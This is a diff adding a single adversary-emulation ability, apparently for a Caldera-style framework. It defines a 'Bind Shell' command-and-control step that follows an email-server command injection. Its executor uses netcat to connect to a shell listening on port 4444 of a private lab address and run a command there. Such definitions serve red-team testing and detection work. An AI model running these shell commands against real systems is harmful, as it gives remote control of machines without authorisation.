@@ -1,0 +1,31 @@
+- tactic: command-and-control
+  technique_name: Bind Shell
+  technique_id: TB008
+  name: Bind Shell
+  description: If this ability is executed after "Command Injection via Email Server",
+    a bind shell on 192.168.3.20 will be achieved
+  executors:
+  - name: sh
+    platform: linux
+    command: bash -c 'nc 192.168.3.20 4444 <<< "ls -l"'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 49f41799-1570-4782-9256-9bfdcd5a9652
